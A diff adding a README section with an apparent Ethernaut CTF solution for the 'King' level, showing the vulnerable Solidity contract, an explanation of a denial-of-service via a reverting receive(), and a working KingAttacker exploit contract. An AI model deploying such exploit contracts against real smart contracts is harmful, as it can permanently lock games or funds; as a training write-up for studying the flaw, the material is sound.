@@ -94,6 +94,16 @@ My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.
 </ol>
 </details>
 
+<details>
+<summary>
+<a href="#09-king">09. King</a>
+</summary>
+<ol>
+    <li><a href="./contracts/09-king/">Contracts</a></li>
+    <li><a href="./scripts/09-king.ts">Script</a></li>
+</ol>
+</details>
+
 ## 00. Hello Ethernaut
 
 This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.
@@ -971,3 +981,96 @@ To ensure that data is private, it needs to be encrypted before being put onto t
 </details>
 
 <a href='./contracts/08-vault/'>Contracts</a> | <a href='./scripts/08-vault.ts'>Script</a>
+
+## 09. King
+
+### Challenge
+
+The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
+
+Such a fun game. Your goal is to break it.
+
+When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
+
+<details>
+  <summary>Instance</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+
+```
+
+</details>
+
+### Solution
+
+<details>
+  <summary>Description</summary>
+
+In order to prevent the owner from appointing himself `king`, we must become the `owner`. However, in the current contract we will not be able to do this. In the `receive` function the state changes after funds are sent to the address. If we make sure that the address of a smart contract is written in the `king` field, which will have its own `receive` function, in which an error will occur, then in this way we will carry out a DOS attack that will not allow changing the owner or anyone else’s value variable `king`.
+To prevent this, it was necessary to perform `transfer` only after updating the storage variables ([Checks-Effects-Interactions pattern](https://docs.soliditylang.org/en/latest/security-considerations.html)).
+
+</details>
+
+<details>
+  <summary>Attacker Contract</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract KingAttacker {
+  address payable kingContract;
+
+  constructor(address payable _kingContract) {
+    kingContract = _kingContract;
+  }
+
+  function attack() external payable {
+    (bool sent, ) = kingContract.call{value: msg.value}('');
+    require(sent, 'Failed attack');
+  }
+
+  receive() external payable {
+    revert();
+  }
+}
+```
+
+</details>
+
+<details>
+  <summary>Comments From OpenZeppelin</summary>
+
+Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.
+
+In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
+
+</details>
+
+<a href='./contracts/09-king/'>Contracts</a> | <a href='./scripts/09-king.ts'>Script</a>
